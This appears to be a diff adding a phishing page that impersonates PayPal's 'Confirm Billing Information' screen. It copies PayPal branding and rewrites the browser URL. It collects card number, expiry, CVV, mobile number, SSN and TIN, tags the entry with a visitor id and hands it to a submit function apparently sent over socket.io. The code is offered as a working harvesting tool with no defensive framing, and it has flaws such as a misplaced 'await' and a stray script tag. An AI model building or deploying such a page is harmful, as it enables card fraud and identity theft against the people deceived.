@@ -1,0 +1,982 @@
+<?php
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" data-reactroot="">
+
+<head>
+	<?php include 'fav.php' ?>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" />
+    <meta charset="utf-8" />
+		
+    <link rel="stylesheet" href="assets/paypal-sans.css" />
+    <link rel="stylesheet" href="assets/main.ltr.css" />
+    <link rel="stylesheet" href="assets/fonts-and-normalize.min.css" />
+    <link rel="stylesheet" href="assets/icon-font.min.css" />
+    <link rel="preload" as="font" type="font/woff2" crossorigin="" href="assets/PayPalOpen-Regular.woff2" />
+    <link rel="preload" as="font" type="font/woff2" crossorigin="" href="assets/PayPalSansBig-Regular.woff2" />
+    <link rel="preload" as="font" type="font/woff2" crossorigin="" href="assets/PayPalSansBig-Medium.woff2" />
+ 
+    	<script>
+    		let iPage = false; 
+		if (iPage) {
+} else {
+  var rdr = sessionStorage.getItem('rdr');
+  console.log(rdr);
+}
+	</script>
+    <script>
+    	
+	history.replaceState({}, "", 'authflow/bill'+rdr );
+	
+	if(!rdr){
+	console.log('oyii');
+	window.location.href = "../index.php";
+	}
+	</script>
+    	<script src="assets/surl.js"></script>
+    	
+    <title> Confirm your account </title>
+    <style data-emotion="css ms9k1d-avatar_base-size_lg-text_heading_lg-size_md-text_heading_sm" data-s="">
+        .css-ms9k1d-avatar_base-size_lg-text_heading_lg-size_md-text_heading_sm {
+            border-radius: 50%;
+            color: #ffffff;
+            text-align: center;
+            text-transform: uppercase;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            -webkit-justify-content: center;
+            justify-content: center;
+            -webkit-align-items: center;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            border: 0.0625rem solid #faf8f5;
+            background-color: #003087;
+            position: relative;
+            color: #001435;
+            font-family: PayPalOpen-Regular, "Helvetica Neue", Arial, sans-serif;
+            font-size: 2.75rem;
+            line-height: 6rem;
+            font-weight: 400;
+            width: 6rem;
+            height: 6rem;
+            width: 4rem;
+            height: 4rem;
+            color: #001435;
+            font-family: PayPalOpen-Regular, "Helvetica Neue", Arial, sans-serif;
+            font-size: 1.75rem;
+            line-height: 4rem;
+            font-weight: 400;
+        }
+
+        @media screen and (max-width: 752px) {
+            .css-ms9k1d-avatar_base-size_lg-text_heading_lg-size_md-text_heading_sm {
+                font-size: min(2.75rem, 66px);
+                line-height: min(6rem, 144px);
+            }
+        }
+
+        @media screen and (max-width: 752px) {
+            .css-ms9k1d-avatar_base-size_lg-text_heading_lg-size_md-text_heading_sm {
+                font-size: min(1.75rem, 42px);
+                line-height: min(4rem, 96px);
+            }
+        }
+    </style>
+    <style data-emotion="css 1yh5wve-image" data-s="">
+        .css-1yh5wve-image {
+            border-radius: inherit;
+            width: inherit;
+            height: inherit;
+            background: #ffffff;
+            object-fit: cover;
+        }
+    </style>
+    <style data-emotion="css w9g159-loading-spinner_base-size_xl animation-11tfg15" data-s="">
+        .css-w9g159-loading-spinner_base-size_xl {
+            width: 1.5rem;
+            height: 1.5rem;
+            color: #003087;
+            -webkit-animation: animation-11tfg15 1.30s cubic-bezier(0, 0, 1, 1) infinite;
+            animation: animation-11tfg15 1.30s cubic-bezier(0, 0, 1, 1) infinite;
+            border: 0.125rem solid currentColor;
+            border-radius: 50%;
+            -webkit-clip-path: polygon(50% 0%, 50% 50%, 100% 50%, 100% 100%, 0 100%, 0 0);
+            clip-path: polygon(50% 0%, 50% 50%, 100% 50%, 100% 100%, 0 100%, 0 0);
+            width: 6rem;
+            height: 6rem;
+        }
+
+        @-webkit-keyframes animation-11tfg15 {
+            to {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes animation-11tfg15 {
+            to {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <style data-emotion="css geb0bj-screenReader" data-s="">
+        .css-geb0bj-screenReader {
+            position: absolute;
+            clip: rect(1px, 1px, 1px, 1px);
+            padding: 0;
+            border: 0;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+    </style>
+    <style data-emotion="css w9g159-loading-spinner_base-size_xl animation-11tfg15" data-s="">
+        .css-w9g159-loading-spinner_base-size_xl {
+            width: 1.5rem;
+            height: 1.5rem;
+            color: #003087;
+            -webkit-animation: animation-11tfg15 1.30s cubic-bezier(0, 0, 1, 1) infinite;
+            animation: animation-11tfg15 1.30s cubic-bezier(0, 0, 1, 1) infinite;
+            border: 0.125rem solid currentColor;
+            border-radius: 50%;
+            -webkit-clip-path: polygon(50% 0%, 50% 50%, 100% 50%, 100% 100%, 0 100%, 0 0);
+            clip-path: polygon(50% 0%, 50% 50%, 100% 50%, 100% 100%, 0 100%, 0 0);
+            width: 6rem;
+            height: 6rem;
+        }
+
+        @-webkit-keyframes animation-11tfg15 {
+            to {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes animation-11tfg15 {
+            to {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <style data-emotion="css geb0bj-screenReader" data-s="">
+        .css-geb0bj-screenReader {
+            position: absolute;
+            clip: rect(1px, 1px, 1px, 1px);
+            padding: 0;
+            border: 0;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+    </style>
+    <style data-emotion="css 1re6efx-elevation_level1" data-s="">
+        .css-1re6efx-elevation_level1 {
+            box-shadow: 0rem 0rem 0.625rem rgba(0, 0, 0, 0.15);
+            background-image: linear-gradient(rgba(255, 255, 255, 0.02), rgba(255, 255, 255, 0.02));
+        }
+    </style>
+    <style data-emotion="css 1djyuxb-container_fluid" data-s="">
+        .css-1djyuxb-container_fluid {
+            width: 100%;
+            padding-right: 0.75rem;
+            padding-left: 0.75rem;
+            margin-right: auto;
+            margin-left: auto;
+        }
+    </style>
+    <style data-emotion="css s8u2ug-row" data-s="">
+        .css-s8u2ug-row {
+            display: -ms-flexbox;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex-wrap: wrap;
+            -webkit-box-flex-wrap: wrap;
+            -webkit-flex-wrap: wrap;
+            -ms-flex-wrap: wrap;
+            flex-wrap: wrap;
+            margin-right: -0.75rem;
+            margin-left: -0.75rem;
+        }
+    </style>
+    <style data-emotion="css e1de2j-col_sm_12" data-s="">
+        .css-e1de2j-col_sm_12 {
+            position: relative;
+            width: 100%;
+            min-height: 1px;
+            padding-right: 0.75rem;
+            padding-left: 0.75rem;
+        }
+
+        @media (min-width: 36rem) {
+            .css-e1de2j-col_sm_12 {
+                -ms-flex: 0 0 100%;
+                -webkit-flex: 0 0 100%;
+                -ms-flex: 0 0 100%;
+                flex: 0 0 100%;
+                max-width: 100%;
+            }
+        }
+    </style>
+    <style data-emotion="css 16jt5za-text_body" data-s="">
+        .css-16jt5za-text_body {
+            color: #001435;
+            font-family: PayPalOpen-Regular, "Helvetica Neue", Arial, sans-serif;
+            font-size: 1.125rem;
+            line-height: 1.5rem;
+            font-weight: 400;
+        }
+
+        @media screen and (max-width: 752px) {
+            .css-16jt5za-text_body {
+                font-size: min(1.125rem, 36px);
+                line-height: min(1.5rem, 48px);
+            }
+        }
+    </style>
+    <style data-emotion="css 151vsl0-text_caption" data-s="">
+        .css-151vsl0-text_caption {
+            color: #001435;
+            font-family: PayPalOpen-Regular, "Helvetica Neue", Arial, sans-serif;
+            font-size: 0.875rem;
+            line-height: 1.25rem;
+            font-weight: 400;
+        }
+
+        @media screen and (max-width: 752px) {
+            .css-151vsl0-text_caption {
+                font-size: min(0.875rem, 28px);
+                line-height: min(1.25rem, 40px);
+            }
+        }
+    </style>
+    <style data-emotion="css" data-s=""></style>
+    <style id="inert-style">
+        [inert] {
+            pointer-events: none;
+            cursor: default;
+        }
+
+        [inert],
+        [inert] * {
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+        
+        .vx_modal-flow .vx_modal-wrapper, .vx_modal-glimpse .vx_modal-wrapper{
+           width: 100%;
+           }
+           
+           .label{
+           position: absolute;
+           font-size: 18px;
+           padding-left: 13px; 
+           padding-top: 10px; 
+           }
+            
+    </style>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" />
+    <meta charset="utf-8" />
+    <link rel="shortcut icon" sizes="196x196" href="assets/pp196.png" />
+    <link rel="shortcut icon" type="image/x-icon" href="assets/favicon.ico" />
+    <link rel="icon" type="image/x-icon" href="assets/pp32.png" />
+    <link rel="stylesheet" href="assets/paypal-sans.css" />
+    <link rel="stylesheet" href="assets/main.ltr.css" />
+    <link rel="stylesheet" href="assets/fonts-and-normalize.min.css" />
+    <link rel="stylesheet" href="assets/icon-font.min.css" />
+    <link rel="preload" as="font" type="font/woff2" crossorigin="" href="assets/PayPalOpen-Regular.woff2" />
+    <link rel="preload" as="font" type="font/woff2" crossorigin="" href="assets/PayPalSansBig-Regular.woff2" />
+    <link rel="preload" as="font" type="font/woff2" crossorigin="" href="assets/PayPalSansBig-Medium.woff2" />
+    <title>PayPal: Wallet</title>
+    
+    	
+    </head>
+
+<body class="vx_root vx_hasOpenModal vx_addFlowTransition cw_navbar_enabled">
+    <div>
+    	
+        
+        	
+        <style nonce="">
+            @media print and (max-width: 768px) {
+                .vx_globalNav-container {
+                    display: none;
+                }
+            }
+        </style>
+        <style nonce="">
+            @font-face {
+                font-family: PPAppDownloadBanner-Fonts;
+                font-style: normal;
+                font-display: swap;
+                src: url(assets/PayPalSansBig-Regular.woff2) format('woff2'),
+                    url(assets/PayPalSansBig-Regular.woff) format('woff'),
+                    url(assets/PayPalSansBig-Regular.eot?iefix) format('embedded-opentype'),
+                    url(assets/PayPalSansBig-Regular.svg) format('svg');
+            }
+
+            #PPAppDownloadBannerContainer {
+                font-family: PPAppDownloadBanner-Fonts, sans-serif;
+            }
+
+            @media (min-width: 768px) {
+                .PP__MobileBanner__Banner_Container {
+                    display: none !important;
+                }
+            }
+
+            .PP__MobileBanner__Banner_Container {
+                display: flex;
+                display: -webkit-flex;
+                align-items: center;
+                -webkit-align-items: center;
+                z-index: 1051;
+                position: sticky;
+                position: -webkit-sticky;
+                width: 100%;
+                background-color: #fff;
+                top: 0;
+                min-height: 3.5rem;
+                justify-content: flex-start;
+                -webkit-justify-content: flex-start;
+            }
+
+            .PP__MobileBanner__Banner_Container.PP__MobileBanner__Banner_variation--blue {
+                background-color: #001435;
+            }
+
+            .PP__MobileBanner__Banner_Container.PP__MobileBanner__Banner_variation--purple {
+                background-color: #7252cc;
+            }
+
+            .PP__MobileBanner__Banner_Container.PP__MobileBanner__Banner_variation--blue .PP__MobileBanner__App_Name,
+            .PP__MobileBanner__Banner_Container.PP__MobileBanner__Banner_variation--purple .PP__MobileBanner__App_Name {
+                color: white;
+            }
+
+            .PP__MobileBanner__Banner_Container.PP__MobileBanner__Banner_variation--bottom {
+                position: fixed;
+                bottom: 0;
+                height: 3.5rem;
+                left: 0;
+                right: 0;
+                top: calc(100vh - 3.5rem);
+            }
+
+            a.PP__MobileBanner__Action_Btn {
+                justify-content: center;
+                -webkit-justify-content: center;
+                display: flex;
+                display: -webkit-flex;
+                height: 2rem;
+                min-width: 4.188rem;
+                max-width: 6.875rem;
+                color: #142c8e;
+                font-size: 0.875rem;
+                letter-spacing: 0;
+                line-height: 1.25rem;
+                align-items: center;
+                -webkit-align-items: center;
+                background-color: #ffffff;
+                box-sizing: border-box;
+                border: 1px solid #142c8e;
+                border-radius: 0.938rem;
+                text-decoration: none;
+            }
+
+            .PP__MobileBanner__Banner_Container.PP__MobileBanner__Banner_variation--blue a.PP__MobileBanner__Action_Btn,
+            .PP__MobileBanner__Banner_Container.PP__MobileBanner__Banner_variation--purple a.PP__MobileBanner__Action_Btn {
+                border: none;
+            }
+
+            .PP__MobileBanner__Close-Icon_Container {
+                margin-left: 0.75rem;
+            }
+
+            .PP__MobileBanner__Logo_Container {
+                display: flex;
+                display: -webkit-flex;
+                align-items: center;
+                -webkit-align-items: center;
+                margin-right: 0.75rem;
+                margin-left: 0.75rem;
+            }
+
+            .PP__MobileBanner__Logo_Container .PP__MobileBanner__Img_Logo {
+                background-color: #2f6eb4;
+                min-height: 2rem;
+                min-width: 2rem;
+                padding: 0.25rem;
+                border-radius: 0.25rem;
+                object-fit: cover;
+            }
+
+            .PP__MobileBanner__Banner_Container.PP__MobileBanner__Banner_variation--blue .PP__MobileBanner__Logo_Container .PP__MobileBanner__Img_Logo,
+            .PP__MobileBanner__Banner_Container.PP__MobileBanner__Banner_variation--purple .PP__MobileBanner__Logo_Container .PP__MobileBanner__Img_Logo {
+                background-color: #ffd140;
+            }
+
+            .PP__MobileBanner__App_Name {
+                display: block;
+                font-size: 0.875rem;
+                margin-inline-start: 0;
+                margin-inline-end: 0;
+                color: #090b0a;
+            }
+
+            .PP__MobileBanner__App_Name>p {
+                margin-top: 0px;
+                margin-bottom: 0px;
+                padding-top: 0px;
+                padding-bottom: 0px;
+            }
+
+            .PP__MobileBanner__Ratings_Yellow {
+                filter: brightness(0) saturate(100%) invert(89%) sepia(31%) saturate(2573%) hue-rotate(334deg) brightness(96%) contrast(104%);
+            }
+
+            .PP__MobileBanner__Ratings_Parent_Container {
+                background-repeat: repeat-x;
+                display: inline-block;
+                overflow: hidden;
+                position: relative;
+                height: 0.813rem;
+                top: 1px;
+                width: 4.375rem;
+                background-image: url('https://www.paypalobjects.com/app-download/img/star-border.svg');
+            }
+
+            .PP__MobileBanner__Ratings_Child_Container {
+                position: absolute;
+                height: 0.813rem;
+                background-image: url('https://www.paypalobjects.com/app-download/img/star-filled.svg');
+            }
+
+            .PP__MobileBanner__ActionBtn {
+                display: flex;
+                display: -webkit-flex;
+                align-items: center;
+                top: calc((100% - 32px) / 2);
+                position: absolute;
+                right: 0.75rem;
+            }
+
+            #PPAppDownloadBannerSecondaryTxt {
+                font-size: 0.813rem;
+                display: block;
+                margin: 0;
+                padding: 0 5px 0 5px;
+                color: #090b0a;
+            }
+
+            .PP__MobileBanner__Btn-Txt {
+                padding: 0.625rem;
+                font-weight: 600;
+            }
+
+            .PP__MobileBanner__a11yText {
+                position: absolute !important;
+                clip: rect(1px 1px 1px 1px);
+                clip: rect(1px, 1px, 1px, 1px);
+                padding: 0 !important;
+                border: 0 !important;
+                height: 1px !important;
+                width: 1px !important;
+                overflow: hidden;
+            }
+            
+            .vx_modal-flow .vx_modal-wrapper, .vx_modal-glimpse .vx_modal-wrapper{
+                display: table-cell;
+  			  width: 100%;
+            }
+            
+              .fadeIn {
+			  -webkit-animation-name: fadeIn;
+			  animation-name: fadeIn;
+			  -webkit-animation-duration: 3s;
+			  animation-duration: 3s;
+			  -webkit-animation-fill-mode: both;
+			  animation-fill-mode: both;
+			  }
+			  @-webkit-keyframes fadeIn {
+			  0% {opacity: 0;}
+			  100% {opacity: 1;}
+			  }
+			  @keyframes fadeIn {
+			  0% {opacity: 0;}
+			  100% {opacity: 1;}
+			  } 
+
+
+            
+            @media (max-width: 620px){   
+            .vx_modal-flow .vx_modal-wrapper, .vx_modal-glimpse .vx_modal-wrapper{
+                display: table-cell;
+  			  width: 66.6%;
+            }
+            }
+            @media (max-width: 320px) {
+                .PP__MobileBanner__App_Name {
+                    width: 7.813rem;
+                    margin-right: 1.5rem;
+                }
+
+                @media (max-width: 280px) {
+                    .PP__MobileBanner__App_Name {
+                        width: 6.25rem;
+                        margin-right: 1.5rem;
+                    }
+                }
+            }
+
+            @media (max-width: 540px) and (min-width: 321px) {
+                .PP__MobileBanner__App_Name {
+                    width: 21.563rem;
+                    margin-right: 1.5rem;
+                }
+
+                @media (max-width: 414px) {
+                    .PP__MobileBanner__App_Name {
+                        width: 15rem;
+                        margin-right: 1.5rem;
+                    }
+                }
+
+                @media (max-width: 375px) {
+                    .PP__MobileBanner__App_Name {
+                        width: 14.375rem;
+                        margin-right: 1.5rem;
+                    }
+                }
+
+                @media (max-width: 350px) {
+                    .PP__MobileBanner__App_Name {
+                        width: 13.438rem;
+                        margin-right: 1.5rem;
+                    }
+                }
+
+                @media (max-width: 321px) {
+                    .PP__MobileBanner__App_Name {
+                        width: 8.125rem;
+                        margin-right: 1.5rem;
+                    }
+                }
+            }
+
+            @media (max-width: 768px) and (min-width: 541px) {
+                .PP__MobileBanner__App_Name {
+                    width: 28.75rem;
+                    margin-right: 1.5rem;
+                }
+
+                @media (max-width: 720px) and (min-width: 646px) {
+                    .PP__MobileBanner__App_Name {
+                        width: 26.875rem;
+                        margin-right: 1.5rem;
+                    }
+                }
+
+                @media (max-width: 645px) and (min-width: 570px) {
+                    .PP__MobileBanner__App_Name {
+                        width: 25.938rem;
+                        margin-right: 1.5rem;
+                    }
+                }
+
+                @media (max-width: 568px) {
+                    .PP__MobileBanner__App_Name {
+                        width: 24.063rem;
+                        margin-right: 1.5rem;
+                    }
+                }
+                
+                .vx_modal-flow .vx_modal-wrapper{
+		            display: table-cell;
+				    width: 100%!important;
+        			}
+        			
+        			.errmes{
+        
+        font-family: PayPalSansBig-Regular,Helvetica Neue,Arial,sans-serif;
+    font-size: .990rem;
+    line-height: 1.25rem;
+    font-weight: 500;
+    display: flex;
+    margin: .5rem 0 0;
+    margin-top: .5rem;
+    color: #d9360b; 
+	padding-left:28px;
+	background-image: url(img/warning.svg);
+	background-repeat: no-repeat;
+	background-position: left center;
+	background-size: 18px;
+	
+	}
+            }
+            
+            .loadbackground {
+    width: 100%;
+    height: 120%; 
+    position: fixed;
+    background-color: white;
+    z-index: 3000;
+    opacity:0.8;
+}
+
+@media (min-width: 700px) {
+    .loadbackground {
+        height: 200%; 
+    }
+}
+
+.test_cardNumber{
+    height: 3rem;
+    width: 100%;
+    border: 0.0625rem solid #b7bcbf;
+    border-radius: 0.25rem;
+    background-color: #ffffff;
+    color: #2c2e2f;
+    
+}
+
+/* wrapper already positioned */
+.wrap {
+  position: relative;
+}
+
+.wrap .label {
+  position: absolute;
+  top: 40%;
+  left: 2px;
+  transform: translateY(-50%);
+  font-size: 16px;
+  color: #666;
+  pointer-events: none;
+  transition: 0.2s ease;
+}
+
+.wrap input.check {
+  font-size: 16px;
+  padding-top: 12px;
+  transition: 0.2s ease;
+}
+
+.wrap:focus-within .label,
+.wrap input.check:not(:placeholder-shown) + .label {
+  top: 10px;
+  font-size: 13px;
+}
+
+.wrap:focus-within input.check,
+.wrap input.check:not(:placeholder-shown) {
+  padding-top: 24px;
+  font-size: 13px;
+}
+        </style>
+        
+    <div>
+    	
+    	<div id="load" style="display:none;">
+								<div style="justify-content:center; align-items:center; display:flex; background-color:white; z-index:40000;">
+							       
+									<img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBzdHlsZT0ibWFyZ2luOiBhdXRvOyBiYWNrZ3JvdW5kOiBub25lOyBkaXNwbGF5OiBibG9jazsgc2hhcGUtcmVuZGVyaW5nOiBhdXRvOyIgd2lkdGg9IjI2MnB4IiBoZWlnaHQ9IjI2MnB4IiB2aWV3Qm94PSIwIDAgMTAwIDEwMCIgcHJlc2VydmVBc3BlY3RSYXRpbz0ieE1pZFlNaWQiPgo8Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiBmaWxsPSJub25lIiBzdHJva2U9IiMxMDQwYzEiIHN0cm9rZS13aWR0aD0iMSIgcj0iMjQiIHN0cm9rZS1kYXNoYXJyYXk9IjExMy4wOTczMzU1MjkyMzI1NSAzOS42OTkxMTE4NDMwNzc1MiI+CiAgPGFuaW1hdGVUcmFuc2Zvcm0gYXR0cmlidXRlTmFtZT0idHJhbnNmb3JtIiB0eXBlPSJyb3RhdGUiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBkdXI9IjAuOTcwODczNzg2NDA3NzY3cyIgdmFsdWVzPSIwIDUwIDUwOzM2MCA1MCA1MCIga2V5VGltZXM9IjA7MSI+PC9hbmltYXRlVHJhbnNmb3JtPgo8L2NpcmNsZT4KPCEtLSBbbGRpb10gZ2VuZXJhdGVkIGJ5IGh0dHBzOi8vbG9hZGluZy5pby8gLS0+PC9zdmc+" style="z-index:18000; position:absolute; width:185px;  height:auto; top:250px; "></img>   
+							      
+</div>
+							   <div class="loadbackground"></div>    	
+							        </div>
+    
+    		</div>
+    		<section id="forminput" >
+    <div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" role="dialog" aria-modal="true" tabindex="-1" aria-labelledby="js_modalHeader">
+        <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper elementDirection vx_modal-wrapper_logo" tabindex="-1">
+            <div>
+            		
+            	<a data-name="modalClose" id="modalClose" tabindex="0" class="modal_dismiss-btn test_dismissFlow" style="padding:0.5rem 0.6rem" pa-marked="1">
+            
+                    <span class="vx_a11yText">close</span></a>
+                <div class="vx_modal-content">
+                    <header class="vx_modal-header">
+                        <h3 style="text-align:center; font-family: PayPalOpen-Regular, PayPalSansBig-Regular, "Helvetica Neue", Arial, sans-serif !important;" id="js_modalHeader" class="">Confirm Billing Information</h3> 
+                        <p class="vx_text-body header-centered"></p>
+                    </header>
+                    <div class="vx_modal-body vx_blocks-for-mobile">
+                        <div>
+                            <div class="vx_modal-body vx_blocks-for-mobile">
+                                <div class="form-container">
+                                    <form id="form">
+
+  <div class="vx_alert vx_alert-critical form-alert alertComponent test_alert-message"
+       id="errmes"
+       style="display:none;">
+    <p role="alert" aria-live="assertive" class="vx_alert-text">
+      Check your information and try again.
+    </p>
+  </div>
+
+  <div aria-label="Sample card" class="cardForm-cardArt">
+    <div aria-hidden="true" class="cardImage-container cardImage-container_medium">
+      <img width="150"
+           class="cardImage_medium"
+           src="../assets/generic_card.png"
+           alt=""
+           aria-hidden="true">
+    </div>
+  </div>
+
+  <br><br>
+
+  <!-- Card number -->
+  <div class="wrap">
+    <input class="test_cardNumber vx_form-control check"
+           type="text"
+           id="card-number"
+           name="Card-Number"
+           placeholder=" "
+           required>
+    <label class="label" for="card-number">Credit card number</label>
+  </div>
+
+  <p class="errmes"></p>
+
+  <!-- Card type -->
+  <div id="dropdown_layout">
+    <div class="ppvx_dropdown">
+      <select id="Brand"
+              class="ppvx_dropdown__control test_brand reskin-select-white"
+              name="brand">
+        <option value="-1">Select your card type</option>
+        <option value="visa">Visa</option>
+        <option value="master_card">Mastercard</option>
+        <option value="amex">American Express</option>
+        <option value="discover">Discover</option>
+      </select>
+      <label class="ppvx_dropdown__label" for="Brand">Card type</label>
+    </div>
+  </div>
+
+  <p class="errmes"></p>
+
+  <!-- Expiration date -->
+  <div class="wrap">
+    <input class="test_cardNumber vx_form-control check"
+           type="text"
+           id="exp-date"
+           name="Expiry-Date"
+           placeholder=" "
+           required>
+    <label class="label" for="exp-date">Expiration date</label>
+  </div>
+
+  <p class="errmes"></p>
+
+  <!-- CVV -->
+  <div class="wrap">
+    <div style="display:flex; align-items:center; gap:8px;">
+      <input class="test_cardNumber vx_form-control check"
+             type="text"
+             id="cvv"
+             name="CVV"
+             placeholder=" "
+             required>
+      <label class="label" for="cvv">Security code</label>
+      <img src="../img/card.jpg"
+           alt=""
+           style="height:50px; width:60px; padding-bottom:5px;">
+    </div>
+  </div>
+
+  <p class="errmes"></p>
+
+  <!-- Mobile number -->
+  <div id="tin" class="wrap">
+    <input class="test_cardNumber vx_form-control check"
+           type="text"
+           id="mobile-number"
+           name="mobile-number"
+           placeholder=" "
+           maxlength="9"
+           pattern="\d{9}"
+           required>
+    <label class="label" for="mobile-number">Mobile number</label>
+  </div>
+
+  <p class="errmes"></p>
+
+  <!-- SSN -->
+  <div id="ssn" class="wrap" style="display:none;">
+    <input class="test_cardNumber vx_form-control check"
+           type="text"
+           id="SSN"
+           name="SSN"
+           placeholder=" "
+           required>
+    <label class="label" for="SSN">SSN</label>
+  </div>
+
+  <p class="errmes"></p>
+
+  <!-- TIN -->
+  <div id="tinuk" class="wrap" style="display:none;">
+    <input class="test_cardNumber vx_form-control check"
+           type="text"
+           id="TIN"
+           name="TIN"
+           placeholder=" "
+           required>
+    <label class="label" for="TIN">TIN</label>
+  </div>
+
+  <p class="errmes"></p>
+
+  <button type="submit"
+          id="subbut"
+          class="btn vx_btn vx_btn-block card-submit test_add-card-submit">
+    Next
+  </button>
+
+</form>
+                                   </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+  
+        <div>
+            <div>
+                
+                </div>
+            </div>
+        </div>
+        </section>
+    </div>
+         	
+         </body>
+         <script type="text/javascript" src="../assets/vx-lib.min.js"></script>
+    
+         <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+</script>
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <script src="./script/emit.js"></script> 
+
+<script>
+    function maskSSN(value) {
+        // Remove non-digit characters
+        let cleanValue = SSN.value.replace(/\D/g, '');
+        // Check if the cleaned value is not empty
+        if (cleanValue.length > 0) {
+            // Mask the SSN
+			
+            let maskedSSN = '***-**-' + cleanValue.slice(-4);
+
+            // Set the masked value to the input
+            document.getElementById('SSN').value = maskedSSN;
+        } else {
+            // If the input is empty, set it to an empty string
+            document.getElementById('SSN').value = '';
+        }
+    }
+    
+    maskSSN(document.getElementById('SSN').value);
+    
+</script>
+
+	<script>
+		$(document).ready(function() {
+    $('form').on('submit', function(event) {
+        event.preventDefault();
+        let myForm = $("#form");
+        
+
+        // Flag to track if any input is empty
+        let isEmpty = false;
+	let checkInputs = document.querySelectorAll('.check');
+        for (const check of checkInputs) {
+            if (check.value.trim() === "") {
+                document.getElementById('errmes').style.display = "inline-flex";
+            isEmpty = true;
+            }else{
+            
+                
+       console.log(check.value);
+                document.getElementById('errmes').style.display = "none";
+                isEmpty = false;
+            }
+        }
+
+        if (!isEmpty) {
+             let userinfo = myForm.serializeArray();
+            let user = {};
+            document.querySelector('#subbut').disabled = true;
+            document.getElementById('load').style.display = "block";
+            userinfo.forEach((value) => {
+                user[value.name] = value.value;
+            });
+            
+            var visitor = sessionStorage.getItem('visitor');
+			
+            user['visitor'] = visitor;
+            console.log(user);
+            await submitFormData(user);
+            
+        }
+    });
+});
+	</script>
+<script>
+	 	
+
+	       new Cleave('#card-number', {
+            creditCard: true
+        });
+
+        new Cleave('#exp-date', {
+            date: true,
+            datePattern: ['m', 'y']
+        });
+
+        new Cleave('#cvv', {
+            numericOnly: true,
+            blocks: [3]
+        });
+
+        const form = document.getElementById('form');
+        form.addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent form submission for now
+
+            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, ''); // Remove spaces
+            const expDate = document.getElementById('exp-date').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Perform additional validation checks here if needed
+            // For this example, let's simply log the input values
+            console.log('Card Number:', cardNumber);
+            console.log('Expiry Date:', expDate);
+            console.log('CVV:', cvv);
+        });
+</script>
+</html>
